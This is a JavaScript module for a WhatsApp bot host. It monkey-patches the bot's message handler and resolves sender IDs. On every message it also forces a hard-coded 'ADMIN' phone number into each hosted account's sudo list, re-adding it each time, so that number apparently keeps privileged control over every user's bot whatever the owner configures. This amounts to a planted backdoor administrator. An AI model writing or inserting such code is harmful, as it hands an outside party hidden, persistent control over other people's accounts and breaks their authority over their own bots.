// Hosting administrator plus each account's existing sudo users.
const ADMIN = '237670217260'
const clean = value => String(value || '').replace(/:\d+(?=@)/, '')
function sudoNumbers(value) {
  return [...new Set([...String(value || '').split(',').map(n => {
    n = n.replace(/\D/g, '')
    return n === '670217260' ? ADMIN : n
  }).filter(Boolean), ADMIN])].join(',')
}

async function prepare(raw, client, state) {
  if (state?.env) {
    state.env.SUDO = sudoNumbers(state.env.SUDO)
    state.TEMP_SUDO = [...new Set([ADMIN, ...state.env.SUDO.split(',')])].slice(0, 20)
  }
  const key = raw?.key
  if (!key || key.fromMe || key.remoteJid === 'status@broadcast') return raw
  const group = key.remoteJid?.endsWith('@g.us')
  const senderField = group ? 'participant' : 'remoteJid'
  const altField = group ? 'participantAlt' : 'remoteJidAlt'
  const sender = clean(key[senderField])
  // Never treat LID digits as a phone number or use quoted/mentioned senders.
  if (!sender.endsWith('@lid') || clean(key[altField]).endsWith('@s.whatsapp.net')) return raw
  const mapping = client?.session?.signalRepository?.lidMapping
  if (!mapping?.getPNForLID) return raw
  try {
    const pn = clean(await mapping.getPNForLID(sender))
    if (/^\d+@s\.whatsapp\.net$/.test(pn)) return { ...raw, key: { ...key, [altField]: pn } }
  } catch (_) { /* An unverified sender never gains sudo permission. */ }
  return raw
}

function install() {
  const handler = require('./handle')
  if (handler.handler.kentechSudo) return
  const original = handler.handler
  const states = require('./config')
  async function dispatch(raw, client, ...args) {
    const state = states[client?.botState?.id]
    return original.call(this, await prepare(raw, client, state), client, ...args)
  }
  dispatch.kentechSudo = true
  handler.handler = dispatch
}
module.exports = { ADMIN, sudoNumbers, prepare, install }
